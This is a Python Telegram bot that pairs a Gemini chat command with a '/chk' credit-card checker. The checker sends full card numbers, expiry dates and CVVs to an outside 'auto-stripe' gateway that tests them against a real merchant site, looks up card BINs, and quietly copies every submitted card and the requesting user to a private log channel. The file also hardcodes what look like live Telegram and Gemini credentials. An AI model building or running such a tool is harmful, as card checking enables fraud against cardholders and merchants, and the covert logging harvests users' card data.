import logging
import re
import time
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ChatAction

# === CONFIG ===
API_ID = 22118129
API_HASH = "43c66e3314921552d9330a4b05b18800"
BOT_TOKEN = "7252664374:AAG-DTJZN5WUQRTZd7yLrDCEIlrYZJ6xxGw"
GEMINI_API_KEY = "AIzaSyBcoZN2N2TKJeaWExZG9vT7hYU7K1--Tgw"
BOT_OWNER = "@andr0idpie9"
LOG_CHANNEL_ID = -1002843745742
GATEWAY_NAME = "Stripe Auth"
GATEWAY_URL_TEMPLATE = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={}"
BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
CC_REGEX = r"/chk (\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4})"

# === Logging Setup ===
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# === Initialize Bot ===
app = Client(
    "CombinedBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# === Gemini Flash API Function ===
def get_gemini_flash_response(prompt: str) -> str:
    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
    headers = {
        "Content-Type": "application/json",
        "X-goog-api-key": GEMINI_API_KEY
    }
    payload = {
        "contents": [
            {
                "parts": [{"text": prompt}]
            }
        ]
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        logging.error(f"Gemini API Error: {e}")
        return "⚠️SYSTEM PE LOAD HAI BHAI!"

# === Split long responses ===
def split_response(text: str, max_len=4000):
    parts = []
    while len(text) > max_len:
        split_at = text.rfind("\n", 0, max_len)
        if split_at == -1:
            split_at = max_len
        parts.append(text[:split_at])
        text = text[split_at:].lstrip()
    parts.append(text)
    return parts

# === BIN Info Function ===
def get_bin_info(bin_code):
    try:
        response = requests.get(BIN_API_URL.format(bin_code), timeout=10)
        if response.status_code != 200:
            return "Unknown", "Unknown", "N/A"

        data = response.json()
        brand = data.get("brand", "Unknown")
        bank = data.get("bank", "Unknown")
        country = data.get("country_name", "Unknown")
        flag = data.get("country_flag", "")

        return brand, bank, f"{country} {flag}" if country != "Unknown" else "N/A"

    except Exception as e:
        logging.error(f"BIN lookup error: {e}")
        return "Unknown", "Unknown", "N/A"

# === Log to Channel Function ===
async def log_to_channel(client: Client, log_type: str, message: Message, content: str, result: str = None):
    try:
        user = message.from_user
        user_info = f"[{user.first_name}](tg://user?id={user.id}) (`{user.id}`)"
        chat_type = message.chat.type.name
        
        if log_type == "AI":
            log_text = (
                f"📝 **New AI Prompt** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Prompt:** `{content}`\n"
                f"**AI Response:**\n{result}"
            )
        elif log_type == "CC":
            log_text = (
                f"💳 **New CC Check** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Card:** `{content}`\n"
                f"**Result:** {result}"
            )
        
        await client.send_message(LOG_CHANNEL_ID, log_text)
    except Exception as e:
        logging.warning(f"Failed to log message: {e}")

# === AI Handler ===
@app.on_message(filters.text & filters.command("ai", prefixes="/"))
async def ai_handler(client: Client, message: Message):
    user_input = message.text[len("/ai"):].strip()
    if not user_input:
        await message.reply("❗ Please provide a prompt after `/ai`.")
        return

    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
    thinking_msg = await message.reply("🧠 *Thinking...*", quote=True)

    # Get AI response
    ai_response = get_gemini_flash_response(user_input)
    parts = split_response(ai_response)

    # Send response
    try:
        if len(parts) == 1:
            final_text = f"{parts[0]}\n\n✨ Powered by {BOT_OWNER}"
            await thinking_msg.edit(final_text)
        else:
            await thinking_msg.edit(parts[0])
            for part in parts[1:-1]:
                await message.reply(part)
            await message.reply(f"{parts[-1]}\n\n✨ Powered by {BOT_OWNER}")
    except Exception as e:
        logging.error(f"Edit/send failed: {e}")
        await message.reply("⚠️ Failed to send AI response.")

    # Log to channel
    await log_to_channel(client, "AI", message, user_input, ai_response)

# === CC Check Handler ===
@app.on_message(filters.text & filters.regex(CC_REGEX))
async def check_card(client: Client, message: Message):
    match = re.search(CC_REGEX, message.text)
    if not match:
        await message.reply("Invalid format. Use: /chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV")
        return

    card = match.group(1)
    bin_code = card[:6]

    # Send initial "processing" message
    proc_msg = await message.reply_text(
        f"↯ Checking..\n\n"
        f"⌯ 𝐂𝐚𝐫𝐝 - {card}\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  {GATEWAY_NAME}\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
    )

    start_time = time.time()

    try:
        response = requests.get(GATEWAY_URL_TEMPLATE.format(card), timeout=60)
        elapsed = round(time.time() - start_time, 2)
        result_json = response.json()
        result_text = response.text.strip()

        if "declined" in result_text.lower():
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        else:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"

    except Exception as e:
        await proc_msg.edit(f"❌ Error: {e}")
        return

    brand, bank, country = get_bin_info(bin_code)

    final_msg = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ {card}\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ {GATEWAY_NAME}\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {result_text}\n\n"
        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
    )

    await proc_msg.edit(final_msg)
    
    # Log to channel
    await log_to_channel(client, "CC", message, card, status)

if __name__ == "__main__":
    print("🚀 Combined Bot is running with /ai and /chk commands...")
    app.run()
